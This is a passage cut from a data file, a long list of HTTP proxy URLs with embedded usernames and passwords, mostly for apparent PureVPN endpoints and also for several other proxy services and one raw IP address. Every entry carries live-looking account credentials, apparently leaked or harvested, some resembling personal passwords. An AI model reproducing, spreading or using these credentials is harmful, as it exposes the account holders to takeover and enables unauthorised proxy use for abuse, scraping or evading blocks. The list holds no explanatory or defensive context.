    "http://purevpn0s9889572:jx5q0xao@px173003.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px420602.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px031901.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px490402.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px460101.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px490401.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px041201.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px041202.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px470108.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px051703.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px040706.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px460403.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px400501.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px380101.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px019603.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px520401.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px014236.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px040805.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px121101.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px013304.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px440401.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px016104.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px180801.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px150902.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px270401.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px591201.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px152201.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px241104.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px241102.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px400408.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px1260303.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px023005.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px022505.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px022507.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px052001.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px051003.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px043006.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px410701.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px015601.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px032004.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px014004.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px490701.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px032002.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px591801.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px022409.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px022408.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px173003.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px420602.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px031901.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px490402.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px460101.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px490401.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px041201.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px041202.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px470108.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px051703.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px040706.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px460403.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px400501.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px380101.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px013301.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px019603.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px520401.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px014236.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px040805.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px121101.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px013304.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px440401.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px016104.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px180801.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px150902.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px270401.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px591203.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px591201.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px152201.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px241104.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px241102.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px400408.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px1260303.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px013302.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px013401.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px013403.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px031901.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px013302.pointtoserver.com:10780",
    "http://naveed:Qwerty_123ABC@196.244.48.26:12345",
    "http://purevpn0s11383538:43z2vhwa@px013401.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px013401.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px013302.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px013302.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px019603.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px031901.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px013403.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px013403.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px015601.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px013401.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px016104.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px019603.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px019603.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px016104.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ca-van.pvdata.host:8080",
    "http://purevpn0s13628768:vecnnovx@px013403.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px031901.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px013403.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px013401.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px019603.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px016104.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px013302.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px013302.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px031901.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px015601.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px015601.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px013401.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px015601.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px015601.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px023005.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@mx-mex.pvdata.host:8080",
    "http://bvmbsmie:shibby2511@us3.cactussstp.com:8080",
    "http://uncpjndo:w77Ebc0h2A@us3.cactussstp.com:3129",
    "http://bvmbsmie:shibby2511@us3.cactussstp.com:3129",
    "http://purevpn0s11383538:43z2vhwa@px016104.pointtoserver.com:10780",
    "http://hughmuir2:lisamarie11@us3.cactussstp.com:81",
    "http://purevpn0s8946341:8RXxgcU2MBumt8@px031901.pointtoserver.com:10780",
    "http://hughmuir2:lisamarie11@us3.cactussstp.com:3129",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px023005.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px016104.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px014004.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px022505.pointtoserver.com:10780",
    "http://uncpjndo:w77Ebc0h2A@us3.cactussstp.com:81",
    "http://uncpjndo:w77Ebc0h2A@ca1.cactussstp.com:8080",
    "http://hughmuir2:lisamarie11@us3.cactussstp.com:8080",
    "http://bvmbsmie:shibby2511@us3.cactussstp.com:81",
    "http://purevpn0s11383538:43z2vhwa@px400501.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@ca1.cactussstp.com:3129",
    "http://purevpn0s11340994:ak3t35fp@px173003.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px022505.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px022507.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px022505.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px023005.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px400501.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@ca1.cactussstp.com:81",
    "http://purevpn0s11340994:ak3t35fp@px051003.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px014004.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px022507.pointtoserver.com:10780",
    "http://uncpjndo:w77Ebc0h2A@us3.cactussstp.com:8080",
    "http://purevpn0s2232045:hww8fqbr72j0@px051003.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px023005.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px022507.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@ca1.cactussstp.com:8080",
    "http://hughmuir2:lisamarie11@ca1.cactussstp.com:8080",
    "http://uncpjndo:w77Ebc0h2A@ca1.cactussstp.com:3129",
    "http://hughmuir2:lisamarie11@ca1.cactussstp.com:3129",
    "http://purevpn0s11340994:ak3t35fp@px051703.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px022507.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px014004.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px173003.pointtoserver.com:10780",
    "http://uncpjndo:w77Ebc0h2A@ca1.cactussstp.com:81",
    "http://purevpn0s2232045:hww8fqbr72j0@px041202.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px014004.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px041201.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px490401.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px051003.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px041202.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px043006.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px173003.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px490402.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px043006.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px040805.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px591801.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px051703.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px331101.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ca-mon.pvdata.host:8080",
    "http://purevpn0s11383538:43z2vhwa@px043006.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px460101.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px040805.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px041201.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px470108.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px591801.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px420602.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px490401.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px331101.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px041201.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px410701.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px410701.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px470108.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px040805.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px460101.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px051703.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px460101.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px470108.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px490402.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px041202.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px051003.pointtoserver.com:10780",
    "http://hughmuir2:lisamarie11@ca1.cactussstp.com:81",
    "http://purevpn0s11340994:ak3t35fp@px040805.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px331101.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ca-tor.pvdata.host:8080",
    "http://purevpn0s11383538:43z2vhwa@px040805.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px051703.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px022505.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px410701.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px591801.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px591801.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px041202.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fr-par.pvdata.host:8080",
    "http://purevpn0s2232045:hww8fqbr72j0@px152201.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px013301.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px410701.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px520401.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@uk3.cactussstp.com:3129",
    "http://uncpjndo:w77Ebc0h2A@au1.cactussstp.com:81",
    "http://purevpn0s11340994:ak3t35fp@px152201.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@pt1.cactussstp.com:3129",
    "http://uncpjndo:w77Ebc0h2A@pt1.cactussstp.com:81",
    "http://uncpjndo:w77Ebc0h2A@pt1.cactussstp.com:8080",
    "http://purevpn0s11340994:ak3t35fp@px180801.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px180801.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px380101.pointtoserver.com:10780",
    "http://hughmuir2:lisamarie11@ru1.cactussstp.com:8080",
    "http://hughmuir2:lisamarie11@uk3.cactussstp.com:3129",
    "http://purevpn0s11383538:43z2vhwa@px380101.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px520401.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@pt1.cactussstp.com:81",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@za-joh.pvdata.host:8080",
    "http://purevpn0s11383538:43z2vhwa@px400408.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px270401.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@my-kua.pvdata.host:8080",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px270401.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-per.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-bri.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ae-dub.pvdata.host:8080",
    "http://hughmuir2:lisamarie11@au1.cactussstp.com:81",
    "http://hughmuir2:lisamarie11@my1.cactussstp.com:3129",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@bg-sof.pvdata.host:8080",
    "http://purevpn0s8732217:i67s60ep@px180801.pointtoserver.com:10780",
    "http://uncpjndo:w77Ebc0h2A@au1.cactussstp.com:3129",
    "http://purevpn0s11383538:43z2vhwa@px490701.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px121102.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px043006.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px180801.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@my1.cactussstp.com:81",
    "http://purevpn0s8732217:i67s60ep@px331101.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px173003.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px331101.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px041201.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@my1.cactussstp.com:8080",
    "http://purevpn0s11383538:43z2vhwa@px270401.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px180801.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px022408.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px520401.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@in1.cactussstp.com:3129",
    "http://hughmuir2:lisamarie11@in1.cactussstp.com:3129",
    "http://purevpn0s2232045:hww8fqbr72j0@px460403.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px121001.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px022408.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px440401.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ch-zur.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@br-sao.pvdata.host:8080",
    "http://bvmbsmie:shibby2511@ro1.cactussstp.com:3129",
    "http://bvmbsmie:shibby2511@it1.cactussstp.com:3129",
    "http://uncpjndo:w77Ebc0h2A@my1.cactussstp.com:81",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@it-mil.pvdata.host:8080",
    "http://purevpn0s11383538:43z2vhwa@px460403.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px520401.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px022408.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px022408.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@in1.cactussstp.com:81",
    "http://bvmbsmie:shibby2511@in1.cactussstp.com:8080",
    "http://purevpn0s2232045:hww8fqbr72j0@px241102.pointtoserver.com:10780",
    "http://uncpjndo:w77Ebc0h2A@in1.cactussstp.com:81",
    "http://purevpn0s11383538:43z2vhwa@px241104.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px591201.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px121101.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px014004.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px460403.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@be-bru.pvdata.host:8080",
    "http://hughmuir2:lisamarie11@pt1.cactussstp.com:8080",
    "http://uncpjndo:w77Ebc0h2A@ro1.cactussstp.com:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@md-chi.pvdata.host:8080",
    "http://hughmuir2:lisamarie11@ro1.cactussstp.com:81",
    "http://hughmuir2:lisamarie11@pt1.cactussstp.com:3129",
    "http://yefprelf:dr2gsmab@in1.cactussstp.com:3129",
    "http://purevpn0s2232045:hww8fqbr72j0@px400408.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px460101.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px470108.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px022409.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px152201.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px270401.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px420602.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px460403.pointtoserver.com:10780",
    "http://yefprelf:dr2gsmab@pt1.cactussstp.com:3129",
    "http://purevpn0s8732217:i67s60ep@px490401.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px150902.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px490701.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px460403.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px152201.pointtoserver.com:10780",
    "http://yefprelf:dr2gsmab@pt1.cactussstp.com:8080",
    "http://purevpn0s11340994:ak3t35fp@px013304.pointtoserver.com:10780",
    "http://uncpjndo:w77Ebc0h2A@pt1.cactussstp.com:3129",
    "http://bvmbsmie:shibby2511@ru1.cactussstp.com:81",
    "http://bvmbsmie:shibby2511@ru1.cactussstp.com:8080",
    "http://bvmbsmie:shibby2511@ru1.cactussstp.com:3129",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@no-osl.pvdata.host:8080",
    "http://purevpn0s2232045:hww8fqbr72j0@px331101.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px490701.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-mel.pvdata.host:8080",
    "http://purevpn0s2232045:hww8fqbr72j0@px022409.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px022409.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px022409.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px400408.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px420602.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px400408.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px470108.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px013301.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@pt1.cactussstp.com:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hk-hon.pvdata.host:8080",
    "http://hughmuir2:lisamarie11@ru1.cactussstp.com:3129",
    "http://purevpn0s8732217:i67s60ep@px032002.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@tw-tai.pvdata.host:8080",
    "http://yefprelf:dr2gsmab@in1.cactussstp.com:81",
    "http://uncpjndo:w77Ebc0h2A@in1.cactussstp.com:8080",
    "http://hughmuir2:lisamarie11@my1.cactussstp.com:81",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@at-wie.pvdata.host:8080",
    "http://purevpn0s11340994:ak3t35fp@px241104.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pt-lis.pvdata.host:8080",
    "http://hughmuir2:lisamarie11@ro1.cactussstp.com:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@de-fra.pvdata.host:8080",
    "http://hughmuir2:lisamarie11@ro1.cactussstp.com:3129",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-kis.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nl-ams.pvdata.host:8080",
    "http://yefprelf:dr2gsmab@in1.cactussstp.com:8080",
    "http://purevpn0s11383538:43z2vhwa@px121101.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px591201.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px121101.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px591201.pointtoserver.com:10780",
    "http://hughmuir2:lisamarie11@it1.cactussstp.com:3129",
    "http://uncpjndo:w77Ebc0h2A@it1.cactussstp.com:3129",
    "http://hughmuir2:lisamarie11@in1.cactussstp.com:8080",
    "http://uncpjndo:w77Ebc0h2A@ru1.cactussstp.com:8080",
    "http://hughmuir2:lisamarie11@ru1.cactussstp.com:81",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-syd.pvdata.host:8080",
    "http://uncpjndo:w77Ebc0h2A@ru1.cactussstp.com:3129",
    "http://uncpjndo:w77Ebc0h2A@ro1.cactussstp.com:81",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px121101.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px591203.pointtoserver.com:10780",
    "http://hughmuir2:lisamarie11@in1.cactussstp.com:81",
    "http://purevpn0s2232045:hww8fqbr72j0@px150902.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px121001.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px591203.pointtoserver.com:10780",
    "http://purevpn0s11340994:ak3t35fp@px440401.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px591201.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@ro1.cactussstp.com:81",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px121102.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@ro1.cactussstp.com:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-got.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@im-bal.pvdata.host:8080",
    "http://hughmuir2:lisamarie11@my1.cactussstp.com:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@id-jak.pvdata.host:8080",
    "http://bvmbsmie:shibby2511@uk2.cactussstp.com:3129",
    "http://purevpn0s8732217:i67s60ep@px591201.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@uk3.cactussstp.com:81",
    "http://yefprelf:dr2gsmab@pt1.cactussstp.com:81",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@kr-seo.pvdata.host:8080",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px591203.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@de-ber.pvdata.host:8080",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px380101.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px241104.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px440401.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px241104.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px591203.pointtoserver.com:10780",
    "http://hughmuir2:lisamarie11@uk3.cactussstp.com:81",
    "http://uncpjndo:w77Ebc0h2A@uk2.cactussstp.com:8080",
    "http://hughmuir2:lisamarie11@uk3.cactussstp.com:8080",
